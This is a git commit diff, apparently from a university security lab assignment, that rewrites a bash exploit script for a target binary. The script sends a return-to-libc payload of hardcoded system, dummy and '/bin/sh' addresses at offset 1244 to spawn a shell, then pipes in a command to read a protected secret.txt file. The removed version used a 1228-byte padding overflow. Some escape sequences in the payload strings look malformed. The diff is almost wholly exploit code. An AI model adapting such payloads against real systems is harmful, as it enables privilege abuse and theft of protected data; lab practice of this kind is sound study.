875da2775647954250685e4d1d3d2c7e09e2a927
orgesskura <s1813106@ed.ac.uk>
2021-04-06 01:44:22 +0100

    task 4 done

--- Task4/attack/task4.sh
+++ Task4/attack/task4.sh
@@ -1,6 +1,6 @@
 #!/usr/bin/env bash
 
-input="$(echo -ne '0x10eee1f7aaaaaaaa8fd8f5f7' | xxd -r)"
-input2="$(python -c "print('A' * 1228 + '\x10\xee\xe1\xf7' + '\xaa\xaa\xaa\xaa' + '\x8f\d8\f5\xf7')")"
-offset=1244
-echo /bin/cat /task4/secret.txt | env -i SHELL='/bin/sh' /task4/s1813106/vuln $(echo -en $input) $offset
+#put system address + dummy address + 'bin/sh' address
+input="$(python -c "print('\x10\xee\xe1\xf7\xb7\xe9\xef\x10\x8f\xd8\xf5\xf7)')")"
+echo /bin/cat /task4/secret.txt | env -i SHELL='/bin/sh' \
+ /task4/s1813106/vuln $(echo -en $input) 1244
